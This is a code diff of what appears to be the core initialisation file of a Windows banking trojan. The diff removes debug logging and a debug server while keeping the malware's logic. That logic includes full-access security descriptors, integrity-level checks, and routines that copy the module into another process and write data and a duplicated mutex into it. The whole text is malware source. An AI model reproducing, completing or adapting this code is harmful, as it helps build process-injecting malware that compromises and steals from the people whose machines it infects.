@@ -5,8 +5,6 @@
 #include<Shlwapi.h>
 #include"defines.h"
 
-#include "config.h"
-#include "debug.h"
 #include "core.h"
 #include "mem.h"
 #include "str.h"
@@ -111,7 +109,6 @@ static bool __inline initLoadModules(DWORD flags)
 {
   if((coreData.modules.kernel32 = Process::_getKernel32Handle()) == NULL)
   {
-    WDEBUG0(WDDT_ERROR, "_getKernel32Handle() failed.");
     return false;
   }
 	if((flags & Core::INITF_INJECT_START) == 0)
@@ -145,7 +142,6 @@ static bool __inline initOsBasic(DWORD flags)
   //Obtain the descriptor for access.
   if((coreData.securityAttributes.buf = WinSecurity::_getFullAccessDescriptors(&coreData.securityAttributes.saAllowAll, &coreData.securityAttributes.sdAllowAll)) == NULL)
   {
-    WDEBUG0(WDDT_ERROR, "GetFullAccessDescriptors failed.");
     return false;
   }
 
@@ -157,7 +153,6 @@ static bool __inline initOsBasic(DWORD flags)
   }
   if((flags & Core::INITF_INJECT_START) == 0 && coreData.integrityLevel < Process::INTEGRITY_MEDIUM)
   {
-    WDEBUG0(WDDT_ERROR, "Bad integrity level for normal startup.");
     return false;
   }
   
@@ -177,11 +172,9 @@ static bool __inline initUserData(DWORD flags)
 	if((coreData.currentUser.token = Process::_getUserByProcessHandle(CURRENT_PROCESS, &coreData.currentUser.sessionId)))
 	{
 		coreData.currentUser.sidLength = CWA(advapi32, GetLengthSid)(coreData.currentUser.token->User.Sid);
-		WDEBUG1(WDDT_INFO, "coreData.currentUser.sessionId=\"%u\"", coreData.currentUser.sessionId);
 	}
 	else 
 	{
-		WDEBUG0(WDDT_ERROR, "Process::_getProcessUserByHandle failed!");
 		return false;
 	}
 
@@ -203,7 +196,6 @@ static bool __inline initPaths(DWORD flags)
   DWORD size = CWA(kernel32, GetModuleFileNameW)(NULL, path, MAX_PATH);
   if((coreData.paths.process = Str::_CopyExW(path, size)) == NULL)
   {
-    WDEBUG0(WDDT_ERROR, "Not enough memory.");
     return false;
   }
   
@@ -231,30 +223,14 @@ static bool __inline initProcessRights(DWORD flags)
       for(DWORD i = 0; i < sizeof(processRights) / sizeof(PROCESSRIGHTS); i++)
       {
         name=(WCHAR *)processRights[i].nameStr;
-#       if(0)
-        if(processRights[i].folder == CSIDL_DESKTOP)
+        if(CWA(shell32, SHGetFolderPathW)(NULL, processRights[i].folder, NULL, SHGFP_TYPE_CURRENT, path) == S_OK &&
+          Fs::_pathCombine(path, path, name) &&
+          CWA(kernel32, lstrcmpiW)(path, coreData.paths.process) == 0)
         {
-          if(fileName == NULL)fileName = CWA(shlwapi, PathFindFileNameW)(coreData.paths.process);
-          if(CWA(shlwapi, PathMatchSpecW)(fileName, name) == TRUE)
-          {
-            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
-            coreData.proccessFlags |= processRights[i].rights;
-            break;
-          }
+          coreData.proccessFlags |= processRights[i].rights;
+          break;
         }
-        else
-#       endif
-        {
-          if(CWA(shell32, SHGetFolderPathW)(NULL, processRights[i].folder, NULL, SHGFP_TYPE_CURRENT, path) == S_OK &&
-            Fs::_pathCombine(path, path, name) &&
-            CWA(kernel32, lstrcmpiW)(path, coreData.paths.process) == 0)
-          {
-            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
-            coreData.proccessFlags |= processRights[i].rights;
-            break;
-          }
-        }
-      }
+			}
     }
   }
 #if !defined _WIN64
@@ -277,23 +253,6 @@ bool Core::init(DWORD flags)
   //Initialize the basic modules.
   Mem::init(512 * 1024);
   
-  //Preparing to output debugging information.
-# if(BO_DEBUG > 0)
-  {
-    DebugClient::Init();
-#   if(BO_DEBUG == 1)  
-    CWA(user32, MessageBeep)(-1);
-#   elif(BO_DEBUG == 2)
-    debugServer = NULL;  
-    if((flags & INITF_INJECT_START) == 0)
-    {
-			debugServer = CWA(kernel32, CreateThread)(NULL, 0, debugServerProc, NULL, 0, NULL); 
-    }
-#   endif
-  }
-# endif
-
-
   //Basic OS data.
   if(!initOsBasic(flags))return false;
 
@@ -311,24 +270,6 @@ bool Core::init(DWORD flags)
 
   //Initialize additional modules.
 
-  //Print the information about the process.
-# if(BO_DEBUG > 0)
-  {
-    LPWSTR userSid;
-		//if(CWA(kernel32, ConvertSidToStringSidW)(coreData.currentUser.token->User.Sid, &userSid) == FALSE)userSid = NULL;
-		userSid = NULL;
-
-    WDEBUG5(WDDT_INFO, "Initialized successfully:\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nSID: %s\r\n",
-                       coreData.integrityLevel,
-                       coreData.proccessFlags,
-                       coreData.paths.process,
-                       CWA(kernel32, GetCommandLineW)(),
-                       userSid == NULL ? L"-" : userSid);
-
-    if(userSid != NULL)CWA(kernel32, LocalFree)(userSid);
-  }
-# endif
-  
   return true;
 }
 
@@ -350,10 +291,8 @@ void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFla
 
   if(image == NULL)
   {	  
-		WDEBUG0(WDDT_ERROR, "Failed _copyModuleToProcess.");
 	  return NULL;
   }
-	WDEBUG0(WDDT_INFO, "OK: _copyModuleToProcess.");
 
   BYTE errorsCount = 0;
   
@@ -362,36 +301,22 @@ void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFla
     HANDLE newMutex;
     if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, processMutex, process, &newMutex, 0, FALSE, DUPLICATE_SAME_ACCESS) == FALSE)
     {
-      WDEBUG0(WDDT_ERROR, "Failed to duplicate mutex of process.");
       errorsCount++;
     }
-		else
-		{
-			WDEBUG0(WDDT_INFO, "OK: DuplicateHandle.");
-		}
   }
   
   //coreData.proccessFlags.
   proccessFlags |= (coreData.proccessFlags & CDPT_INHERITABLE_MASK);
   if(!copyDataToProcess(process, image, &coreData.proccessFlags, &proccessFlags, sizeof(DWORD)))
   {
-    WDEBUG0(WDDT_ERROR, "Failed coreData.proccessFlags.");
     errorsCount++;
   }
-	else
-	{
-		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.proccessFlags.");
-	}
 
   //Specify the current module.
   if(!copyDataToProcess(process, image, &coreData.modules.current, &image, sizeof(HMODULE)))
   {
-    WDEBUG0(WDDT_ERROR, "Failed coreData.modules.current.");
     errorsCount++;
   }
-	{
-		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.modules.current.");
-	}
 
   //Error outputs.
   if(errorsCount != 0)
